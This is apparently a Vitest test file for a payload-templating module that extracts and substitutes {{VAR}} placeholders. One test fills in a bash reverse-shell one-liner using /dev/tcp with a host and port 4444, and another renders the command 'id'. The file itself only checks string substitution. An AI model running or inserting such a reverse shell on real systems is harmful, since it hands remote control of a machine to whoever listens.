import { describe, expect, it } from "vitest";
import { extractVariables, renderPayload } from "./render";

describe("payload variable rendering", () => {
  it("extracts unique variable names in first-seen order", () => {
    const body = "curl http://{{HOST}}/{{PATH}} -H 'X: {{HOST}}'";
    expect(extractVariables(body)).toEqual(["HOST", "PATH"]);
  });

  it("substitutes every provided variable", () => {
    const { rendered, unresolved } = renderPayload(
      "bash -i >& /dev/tcp/{{HOST}}/{{PORT}} 0>&1",
      { HOST: "10.0.0.1", PORT: "4444" },
    );
    expect(rendered).toBe("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
    expect(unresolved).toEqual([]);
  });

  it("reports unresolved variables and leaves the placeholder in place", () => {
    const { rendered, unresolved } = renderPayload(
      "http://{{HOST}}/{{PATH}}?q={{QUERY}}",
      { HOST: "example.com" },
    );
    expect(rendered).toBe("http://example.com/{{PATH}}?q={{QUERY}}");
    expect(unresolved).toEqual(["PATH", "QUERY"]);
  });

  it("tolerates whitespace inside braces", () => {
    const { rendered, unresolved } = renderPayload("{{ CMD }}", { CMD: "id" });
    expect(rendered).toBe("id");
    expect(unresolved).toEqual([]);
  });

  it("does not substitute an empty vars map but reports all", () => {
    const { rendered, unresolved } = renderPayload("{{A}}-{{B}}", {});
    expect(rendered).toBe("{{A}}-{{B}}");
    expect(unresolved).toEqual(["A", "B"]);
  });
});
